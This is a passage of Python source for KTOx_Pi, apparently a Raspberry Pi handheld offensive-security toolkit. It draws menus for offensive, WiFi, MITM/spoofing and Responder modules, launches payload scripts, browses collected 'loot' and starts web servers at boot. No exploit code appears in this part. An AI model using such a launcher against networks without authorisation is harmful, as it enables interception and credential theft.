                            t = _truncate(label.strip(), 96)
                            draw.text((19, row_y + 1), t,    font=text_font, fill=fill)
                        else:
                            t = _truncate(label.strip(), 110)
                            draw.text((5,  row_y + 1), t,    font=text_font, fill=fill)
                    # ── Scroll pip ────────────────────────────────────────
                    if total > WINDOW:
                        avail = _RH * WINDOW
                        pip_h = max(6, int(WINDOW / total * avail))
                        pip_y = _ST + int(offset / max(1, total - WINDOW) * (avail - pip_h))
                        draw.rectangle([125, pip_y, 127, pip_y + pip_h],
                                       fill=color.border)
                time.sleep(0.08)
                btn = getButton(timeout=0.5)
                if btn is None:                                  continue
                elif btn == "KEY_DOWN_PIN":                      sel = (sel + 1) % total
                elif btn == "KEY_UP_PIN":                        sel = (sel - 1) % total
                elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):  items[sel][1]()
                elif btn in ("KEY_LEFT_PIN", "KEY1_PIN"):        return
                elif btn == "KEY2_PIN":
                    self.which = "home"; return
            return

        # ── Payload category grid view ────────────────────────────────────────
        if key == "pay":
            cats   = [(cat_key, cat_label)
                      for cat_key, cat_label in PAYLOAD_CATEGORIES
                      if _list_payloads(cat_key)]
            if not cats:
                Dialog_info("No payloads found.\nDrop .py files into\n/payloads/<cat>/", wait=True)
                return

            total  = len(cats)
            COLS   = 2
            ROWS   = 4
            PAGE   = COLS * ROWS     # 8 cells per page
            # Cell geometry (128×128 screen, title strip y=13-24, grid y=26+)
            _CW    = 62              # cell width
            _CH    = 24              # cell height
            _GX    = 3              # grid left margin
            _GY    = 26             # grid top margin
            _GAP   = 2              # gap between columns
            sel    = 0              # flat category index

            while True:
                page         = sel // PAGE
                page_start   = page * PAGE
                page_cats    = cats[page_start:page_start + PAGE]
                sel_in_page  = sel - page_start
                sel_row      = sel_in_page // COLS
                sel_col      = sel_in_page % COLS
                num_pages    = (total + PAGE - 1) // PAGE

                with draw_lock:
                    _draw_toolbar()
                    color.DrawMenuBackground()
                    color.DrawBorder()
                    # Title strip
                    draw.rectangle([3, 13, 125, 24], fill="#1a0000")
                    _pg_lbl = f"PAYLOADS  {page+1}/{num_pages}" if num_pages > 1 else "PAYLOADS"
                    _centered(_pg_lbl[:20], 13, font=small_font, fill=color.border)
                    draw.line([(3, 24), (125, 24)], fill=color.border, width=1)
                    # Grid cells
                    for idx, (ckey, clabel) in enumerate(page_cats):
                        crow = idx // COLS
                        ccol = idx % COLS
                        cx   = _GX + ccol * (_CW + _GAP)
                        cy   = _GY + crow * _CH
                        is_sel = (crow == sel_row and ccol == sel_col)
                        # Cell background
                        cell_fill = color.select if is_sel else "#0d0000"
                        draw.rectangle([cx, cy, cx + _CW - 1, cy + _CH - 2],
                                       fill=cell_fill, outline=color.border)
                        txt_fill = color.selected_text if is_sel else color.text
                        icon = _FA_ICONS.get(clabel, "")
                        if icon and icon_font:
                            draw.text((cx + 3, cy + 2), icon, font=icon_font, fill=txt_fill)
                            draw.text((cx + 16, cy + 3), clabel[:7], font=small_font, fill=txt_fill)
                        else:
                            draw.text((cx + 3, cy + 6), clabel[:8], font=small_font, fill=txt_fill)
                        # Payload count badge — bottom-right corner of cell
                        n = len(_list_payloads(ckey))
                        draw.text((cx + _CW - 14, cy + _CH - 11),
                                  str(n), font=small_font, fill="#8B0000")
                    # Page indicator pips
                    if num_pages > 1:
                        for pi in range(num_pages):
                            px = 60 + pi * 6
                            pc = color.border if pi == page else "#330000"
                            draw.rectangle([px, 124, px + 4, 127], fill=pc)

                time.sleep(0.08)
                btn = getButton(timeout=0.5)
                if btn is None:
                    continue
                elif btn == "KEY_DOWN_PIN":
                    sel = (sel + COLS) % total  # move one row down
                elif btn == "KEY_UP_PIN":
                    sel = (sel - COLS) % total  # move one row up
                elif btn == "KEY_RIGHT_PIN":
                    sel = (sel + 1) % total
                elif btn == "KEY_LEFT_PIN":
                    if sel > 0:
                        sel -= 1
                    else:
                        return  # back at first category
                elif btn in ("KEY_PRESS_PIN",):
                    ckey = cats[sel][0]
                    saved      = self.which
                    self.which = f"pay_{ckey}"
                    self.navigate(f"pay_{ckey}")
                    self.which = saved
                elif btn == "KEY1_PIN":
                    return
                elif btn == "KEY2_PIN":
                    self.which = "home"; return
            return

        # Standard navigate
        tree = self._menu()

        if key == "loot":
            self._browse_loot()
            return

        items = tree.get(key)
        if not items:
            Dialog_info("Empty menu.", wait=True)
            return

        labels = [item[0] for item in items]
        sel    = 0
        WINDOW = 7

        while True:
            total  = len(labels)
            offset = max(0, min(sel-2, total-WINDOW))
            window = labels[offset:offset+WINDOW]

            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                # menu title strip
                _titles = {
                    "home":"▐ KTOx_Pi ▌","net":"Network",
                    "off":"Offensive","wifi":"WiFi Engine",
                    "mitm":"MITM & Spoof","resp":"Responder",
                    "purple":"Purple Team","sys":"System","pay":"Payloads",
                }
                _t = _titles.get(key, key.upper())
                draw.rectangle([3,13,125,24], fill="#1a0000")
                _centered(_t[:18], 13, font=small_font, fill=color.border)
                draw.line([(3,24),(125,24)], fill=color.border, width=1)
                _start_y = 26
                for i, label in enumerate(window):
                    is_sel = (i == sel-offset)
                    row_y  = _start_y + 13*i
                    if is_sel:
                        draw.rectangle(
                            [3, row_y, 124, row_y+12],
                            fill=color.select
                        )
                    fill = color.selected_text if is_sel else color.text
                    icon = _icon_for(label)
                    if icon:
                        draw.text((5, row_y+1), icon, font=icon_font, fill=fill)
                        t = _truncate(label.strip(), 94)
                        draw.text((19, row_y+1), t, font=text_font, fill=fill)
                    else:
                        t = _truncate(label.strip(), 108)
                        draw.text((6, row_y+1), t, font=text_font, fill=fill)
                # Scroll pip
                if total > WINDOW:
                    pip_h = max(6, int(WINDOW / total * 110))
                    pip_y = 14 + int(offset / max(1, total - WINDOW) * (110 - pip_h))
                    draw.rectangle([125, pip_y, 127, pip_y + pip_h], fill=color.border)

            time.sleep(0.08)
            btn = getButton(timeout=0.5)

            if btn is None:                                continue
            elif btn == "KEY_DOWN_PIN":                    sel = (sel+1)%len(labels)
            elif btn == "KEY_UP_PIN":                      sel = (sel-1)%len(labels)
            elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
                self.select = sel
                action = items[sel][1]
                if isinstance(action, str):
                    saved      = self.which
                    self.which = action
                    self.navigate(action)
                    self.which = saved
                elif callable(action):
                    action()
            elif btn in ("KEY_LEFT_PIN","KEY1_PIN"):       return
            elif btn == "KEY2_PIN":
                self.which = "home"; return
            elif btn == "KEY3_PIN":
                if ktox_state.get("running"):
                    ktox_state["running"] = None
                    Dialog_info("Stopped.", wait=False, timeout=1)

    
    def _nav_scan(self):
        exec_payload("Navarro/navarro_scan.py")
    def _nav_ports(self):
        exec_payload("Navarro/navarro_ports.py")
    def _nav_reports(self):
        self._browse_dir(KTOX_DIR + "/Navarro/reports", "Navarro Reports")

    def home_loop(self):
        while True:
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue
            self.navigate("home")

    # ── System actions ─────────────────────────────────────────────────────────

    def _webui_status(self):
        ip = get_ip()
        GetMenuString([
            f" WebUI:  http://{ip}:8080",
            f" WS:     ws://{ip}:8765",
            f" Frame:  /dev/shm/ktox_last.jpg",
            " Open from any browser",
            " on the same LAN.",
        ])

    def _refresh(self):
        Dialog_info("Refreshing…", wait=False, timeout=1)
        refresh_state()
        Dialog_info(f"IF: {ktox_state['iface']}\nGW: {ktox_state['gateway']}", wait=True)

    def _sysinfo(self):
        rc, kern = _run(["uname","-r"])
        rc2, up  = _run(["uptime","-p"])
        GetMenuString([
            f" KTOx_Pi v{VERSION}",
            f" Kernel: {kern.strip()[:18]}",
            f" {up.strip()[:22]}",
            f" Temp:  {_temp_c:.1f} C",
            f" Loot:  {loot_count()} files",
            f" IP:    {get_ip()}",
        ])

    def _discord_status(self):
        wh = Path(INSTALL_PATH+"discord_webhook.txt")
        if wh.exists() and wh.stat().st_size > 10:
            url   = wh.read_text().strip()
            short = url[:28]+"…" if len(url)>28 else url
            lines = [" Discord webhook:", f" {short}"]
        else:
            lines = [" Discord: not set.",
                     " Edit:", " discord_webhook.txt"]
        GetMenuString(lines)

    def _reboot(self):
        if YNDialog("REBOOT", y="Yes", n="No", b="Reboot device?"):
            Dialog_info("Rebooting…", wait=False, timeout=2)
            os.system("reboot")

    def _shutdown(self):
        if YNDialog("SHUTDOWN", y="Yes", n="No", b="Shut down?"):
            Dialog_info("Shutting down…", wait=False, timeout=2)
            os.system("sync && poweroff")

    def _browse_loot(self):
        try:
            files = sorted(Path(LOOT_DIR).rglob("*"),
                           key=lambda f: f.stat().st_mtime, reverse=True)
            files = [f for f in files if f.is_file()]
        except Exception:
            files = []
        if not files:
            Dialog_info("No loot yet!", wait=True)
            return
        items = [f" {f.name[:22]}" for f in files[:30]]
        sel   = GetMenuString(items)
        if not sel: return
        fname = sel.strip()
        match = [f for f in files if f.name == fname]
        if not match: return
        try:
            lines = match[0].read_text(errors="ignore").splitlines()
            GetMenuString([f" {l[:24]}" for l in lines[:60]])
        except Exception:
            Dialog_info("Can't read file.", wait=True)


# ── Singleton ──────────────────────────────────────────────────────────────────
m = KTOxMenu()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Boot splash ────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def show_splash():
    """Boot splash — shown after logo BMP."""
    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        # Top and bottom blood-red bars
        draw.rectangle([(0,0),(128,4)],     fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        # Side accent lines
        draw.rectangle([(0,0),(2,128)],     fill="#3a0000")
        draw.rectangle([(126,0),(128,128)], fill="#3a0000")
        # Title
        _centered("▐ KTOx_Pi ▌",  10, fill=color.border)
        # Divider
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        # Subtitle
        _centered("Network Control", 26, fill=color.selected_text)
        _centered("Suite",           40, fill=color.selected_text)
        # Divider
        draw.line([(8,52),(120,52)], fill="#3a0000", width=1)
        # Hardware
        _centered("Pi Zero 2W",      58, fill=color.text)
        _centered("Kali ARM64",      70, fill=color.text)
        # Version
        _centered(f"v{VERSION}",     84, fill=color.border)
        # Bottom tagline
        draw.line([(8,96),(120,96)],  fill="#3a0000", width=1)
        _centered("authorized",     102, fill="#6b1a1a")
        _centered("eyes only",      114, fill="#6b1a1a")
    time.sleep(1)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Boot sequence ──────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def boot():
    os.makedirs(LOOT_DIR,   exist_ok=True)
    os.makedirs(PAYLOAD_DIR, exist_ok=True)

    # Symlink /root/KTOx/loot → KTOx loot for payload compatibility
    rj_dir  = "/root/KTOx"
    rj_loot = rj_dir + "/loot"
    os.makedirs(rj_dir, exist_ok=True)
    if not os.path.exists(rj_loot):
        try: os.symlink(LOOT_DIR, rj_loot)
        except OSError: pass

    _hw_init()

    show_splash()

    # Start refresh and web servers in parallel — don't block boot
    threading.Thread(target=refresh_state, daemon=True).start()

    for script in ("device_server.py", "web_server.py"):
        spath = Path(INSTALL_PATH + script)
        if spath.exists():
            try:
                subprocess.Popen(
                    ["python3", str(spath)],
                    cwd=INSTALL_PATH,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except Exception:
                pass

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        draw.rectangle([(0,0),(128,4)],   fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        _centered("▐ KTOx_Pi ▌", 10, fill=color.border)
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        _centered("Starting…",    34, fill=color.text)
        _centered("WebUI  :8080", 52, fill="#3a0000")
        _centered("WS     :8765", 64, fill="#3a0000")

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill="#000000")
        draw.rectangle([(0,0),(128,4)],     fill=color.border)
        draw.rectangle([(0,124),(128,128)], fill=color.border)
        _centered("▐ KTOx_Pi ▌",  10, fill=color.border)
        draw.line([(8,22),(120,22)], fill="#3a0000", width=1)
        _centered("READY",          34, fill="#2ecc71")
        draw.line([(8,46),(120,46)], fill="#3a0000", width=1)
        _centered(f"IP: {get_ip()}", 52, fill=color.selected_text)
        _centered(f"IF: {ktox_state['iface']}", 64, fill=color.selected_text)
        draw.line([(8,76),(120,76)], fill="#3a0000", width=1)
        _centered("WebUI :8080",    82, fill=color.text)
        _centered("WS    :8765",    94, fill=color.text)
        draw.line([(8,106),(120,106)], fill="#3a0000", width=1)
        _centered("authorized",    112, fill="#6b1a1a")
    time.sleep(2)

    with draw_lock:
        draw.rectangle([(0,0),(128,128)], fill=color.background)
        color.DrawBorder()

    start_background_loops()
    print(f"[KTOx] Boot OK — IP={get_ip()} IF={ktox_state['iface']}")
    m.home_loop()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Entry point ────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _sig(sig, frame):
    _stop_evt.set()
    if HAS_HW:
        try: GPIO.cleanup()
        except Exception: pass
    sys.exit(0)


if __name__ == "__main__":
    if HAS_HW and os.geteuid() != 0:
        print("Must run as root"); sys.exit(1)
    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        boot()
    except Exception as e:
        print(f"[KTOx] Fatal: {e}")
        import traceback; traceback.print_exc()
        print("[KTOx] Headless fallback — access via http://<ip>:8080")
        try:
            while True: time.sleep(60)
        except KeyboardInterrupt:
            pass
